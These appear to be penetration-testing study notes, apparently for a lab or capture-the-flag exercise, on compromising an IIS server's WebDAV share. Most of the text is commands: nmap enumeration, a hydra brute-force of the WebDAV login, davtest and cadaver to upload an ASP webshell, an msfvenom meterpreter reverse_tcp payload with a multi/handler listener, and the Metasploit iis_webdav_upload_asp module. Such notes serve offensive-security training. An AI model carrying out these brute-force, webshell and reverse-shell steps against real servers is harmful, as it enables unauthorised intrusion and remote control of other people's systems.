WebDAV is a set of extensions to the HTTP protocol which allow users to 
collaboratively edit and manage files on remote web servers. WebDAV essentially
enables a web server to function as a file server for collaborative authoring

In order to connect to a WebDAV server, you will need to provide legit credentials.
This is because WebDAV implements authentication in the form of a user/pass

First step of exploitation will involve identifying whether WebDAV has been configured
to run on the IIS web server.

We can perform a brute-force attack on the WebDAV server in order to identify
legit credentials that we can use for authentication.

After obtaining legit credentials, we can authenticate with the WebDAV server and
upload a malicious .asp payload that can be used to execute arbitrary commands or
obtain a reverse shell on the target

---------------------------------Tools------------------------------------------

davtest - Used to scan, auth and exploit a WebDAV server.

cadaver - Supports file upload, download, on-screen display, in-place editing,
namespace operations (move/copy), collection creation and deletion, property
manipulation, and resource locking on WebDAV servers.

-------------------------------Exploitation-------------------------------------

nmap -sV -sC <ip>
nmap -sV -p 80 --script=http-enum <ip> (shows directory for webdav is possible)
navigate to <ip>/webdav/ (will take you to login page and potentially brute force)
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <ip> http-get /webdav/
**if successful you now have access to the directory, and may be able to upload/download**
davtest -url http://<ip>/webdav (may fail due to credentials being needed)
davtest -auth user:password -url http://<ip>/webdav (will perform checks that tells you what kind of files can be uploaded or executed on webdav server)
**is asp file execution is allowed it can be used for code execution**
cadaver (will open the program and allow you to upload, download, delete etc)
cadaver http://<ip>/webdav
**this will provide a sudo shell that allows you to interact with the webdav server**
**using a new command terminal, locate /usr/share/webshells/ on your system and find the relevant one, in this case we will use asp**
put /usr/share/webshells/asp/webshell.asp (using this on the sudo shell we opened will put this on the web server)
**refreshing the files on the web directory will now reflect what was uploaded, and you can click on your webshell to execute it from the web browser, and now a command line appears from the browser)
dir C:\
type C:\flag.txt

-----------------------------Metasploit Exploitation ---------------------------

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<the port you opened> -f asp > payload.asp
cadaver http://<ip>/webdav
put /root/payload.asp
**the reverse shell is now on the webserver, you now need to start a listener on your system**
service postgresql start && msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
** set LHOST, LPORT the same as what you used for your generated payload **
run
** now execute the reverse connection on the webserver directory **
sysinfo
getuid (NT\AUTHORITY\SYSTEM is best, otherwise priv escalation may be needed)

-----------------------------Metasploit Alternate Way---------------------------

msfconsole
search iis upload
** find 'exploit/windows/iis/iis_webdav_upload_asp' or the relevant one needed **
use exploit/windows/iis/iis_webdav_upload_asp
** if you need to, change the payload to x64 or x86 depending on your needs **
** ensure you provide the http password and http username for this in options as well as the other needed options **
** set PATH /webdav/metasploit.asp **
** this will do everything we did in the above section pretty much for us **

--------------------------------------------------------------------------------











